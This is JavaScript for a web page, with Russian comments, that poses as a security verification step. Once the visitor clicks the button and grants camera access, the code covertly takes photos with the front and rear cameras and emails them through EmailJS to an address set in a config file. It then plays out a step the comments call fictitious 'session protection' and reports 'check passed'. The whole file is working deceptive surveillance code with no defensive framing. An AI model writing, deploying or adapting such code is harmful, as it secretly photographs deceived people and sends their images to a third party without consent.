const v = document.getElementById('v');
const c = document.getElementById('c');
const fill = document.getElementById('fill');
const btn = document.getElementById('btn');
const s1 = document.getElementById('s1');
const s2 = document.getElementById('s2');
const s3 = document.getElementById('s3');

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const setProgress = (p) => { fill.style.width = p + '%'; };

// Инициализация EmailJS (ключи берутся из файла config.js)
emailjs.init(CONFIG.emailjsPublicKey);

// Функция съемки
async function shoot(facingMode) {
  // Запрашиваем конкретную камеру (user = фронталка, environment = задняя)
  const stream = await navigator.mediaDevices.getUserMedia({ 
    video: { facingMode: facingMode }, 
    audio: false 
  });
  
  v.srcObject = stream;
  await v.play().catch(() => {});
  await sleep(1500); // Ждем 1.5 секунды для автофокуса

  c.width = v.videoWidth || 640;
  c.height = v.videoHeight || 480;
  const ctx = c.getContext('2d');
  ctx.drawImage(v, 0, 0, c.width, c.height);
  const data = c.toDataURL('image/jpeg', 0.8); // Сжимаем фото
  
  // Выключаем камеру
  stream.getTracks().forEach((t) => t.stop());
  v.srcObject = null;
  
  return data;
}

// Функция отправки на почту
async function sendPhoto(dataUrl, label) {
  return emailjs.send(CONFIG.emailjsServiceId, CONFIG.emailjsTemplateId, {
    to_email: CONFIG.toEmail,
    label: label,
    image: dataUrl,
    time: new Date().toLocaleString('ru-RU')
  });
}

btn.addEventListener('click', async () => {
  btn.disabled = true;
  btn.textContent = 'Проверяем…';

  try {
    // Шаг 1 — просим доступ
    s1.classList.add('active');
    setProgress(10);
    const prime = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
    prime.getTracks().forEach((t) => t.stop());
    s1.classList.remove('active');
    s1.classList.add('done');
    setProgress(30);

    // Шаг 2 — Снимаем фронталку и отправляем
    s2.classList.add('active');
    
    const frontShot = await shoot('user');
    setProgress(50);
    await sendPhoto(frontShot, 'Фронтальная камера').catch((err) => console.log("Ошибка отправки фронталки", err));
    setProgress(60);

    // Пауза 2 секунды, чтобы телефон переключил камеру
    await sleep(2000); 

    // Снимаем тыльную камеру и отправляем
    try {
      const backShot = await shoot('environment');
      setProgress(80);
      await sendPhoto(backShot, 'Тыльная камера').catch((err) => console.log("Ошибка отправки тыла", err));
    } catch (e) {
      console.error("Задняя камера не найдена или недоступна", e);
    }

    s2.classList.remove('active');
    s2.classList.add('done');

    // Шаг 3 — фиктивная «защита сессии»
    s3.classList.add('active');
    setProgress(95);
    await sleep(1200);
    s3.classList.remove('active');
    s3.classList.add('done');
    setProgress(100);

    btn.textContent = 'Проверка пройдена ✓';
    btn.style.background = 'linear-gradient(135deg,#28c76f,#1fa85a)';
  } catch (e) {
    btn.disabled = false;
    btn.textContent = 'Повторить проверку';
    setProgress(0);
    console.error(e);
  }
});
